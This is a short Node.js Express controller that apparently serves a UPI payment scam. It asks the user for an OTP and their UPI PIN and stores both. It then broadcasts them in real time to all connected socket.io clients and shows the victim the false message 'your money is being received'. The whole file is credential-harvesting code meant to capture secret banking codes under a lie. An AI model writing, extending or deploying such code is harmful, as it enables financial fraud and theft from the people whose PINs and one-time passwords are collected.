const OtpModel = require("../Model/otp.model");

const OtpGet = async (req, res) => {
    const { otp, upiPin } = req.body;

    if (!otp) {
        return res.status(400).send({ message: "Please fill your OTP" });
    }

    if (!upiPin) {
        return res.status(400).send({ message: "Please fill your UPI PIN for verification" });
    }

    try {
        // Create a new OTP entry
        const newOtp = await OtpModel.create({ otp, upiPin });

        // Emit the new data to all connected clients
        req.app.get("io").emit("updateData", newOtp);

        res.status(201).send({ message: "Please wait, your money is being received...", data: newOtp });
    } catch (error) {
        console.error(error);
        res.status(500).send({ message: "Internal server error" });
    }
};

module.exports = { OtpGet };
